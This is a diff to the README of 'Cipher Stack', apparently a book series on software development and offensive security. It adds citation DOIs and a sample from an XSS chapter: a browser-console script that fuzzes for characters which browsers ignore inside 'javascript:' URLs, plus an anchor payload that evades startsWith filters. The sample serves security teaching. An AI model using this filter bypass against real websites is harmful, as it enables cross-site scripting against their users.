@@ -8,6 +8,18 @@
 
 ---
 
+# Citation
+
+If you use this work, please cite:
+
+Cipher Stack: Dev  
+DOI: 10.5281/zenodo.20754677
+
+Cipher Stack: Offense  
+DOI: 10.5281/zenodo.20945302
+
+---
+
 ## About
 
 Cipher Stack is a two-volume technical book series created to provide a structured learning path across software development and offensive security.
@@ -18,6 +30,35 @@ Cipher Stack is divided into two independent but connected volumes:
 
 * **Cipher Stack: Dev**
 * **Cipher Stack: Offense**
+
+---
+
+## Sample — XSS: Fuzzing the javascript: Protocol
+
+From **Chapter: XSS** — CipherStack-Offense
+
+Running the following in the browser console finds every Unicode character that, when placed between `javascript` and `:`, still produces a valid `javascript:` protocol — useful against filters that rely on `startsWith('javascript:')`:
+
+```javascript
+log = []
+let anchor = document.createElement('a');
+for (let i = 0; i <= 0x0ffff; i++){
+    anchor.href = `javascript${String.fromCodePoint(i)}:`;
+    if (anchor.protocol === 'javascript:'){
+        log.push(i);
+    }
+}
+console.log(log);
+log.map(x => String.fromCharCode(x));
+```
+
+Output reveals characters like `\t` (0x09), `\n` (0x0A) and others that browsers normalize silently — allowing payloads like:
+
+```html
+<a href="javascript&#x09;:alert(origin)">click</a>
+```
+
+This pattern appears throughout the book: understand the spec, find what browsers normalize, exploit the gap between what the filter sees and what the browser executes.
 
 ---
 
@@ -111,12 +152,4 @@ Soroush Maleki
 
 Application Security Researcher / Developer
 
-# Citation
 
-If you use this work, please cite:
-
-Cipher Stack: Dev  
-DOI: 10.5281/zenodo.20754677
-
-Cipher Stack: Offense  
-DOI: 10.5281/zenodo.20945302
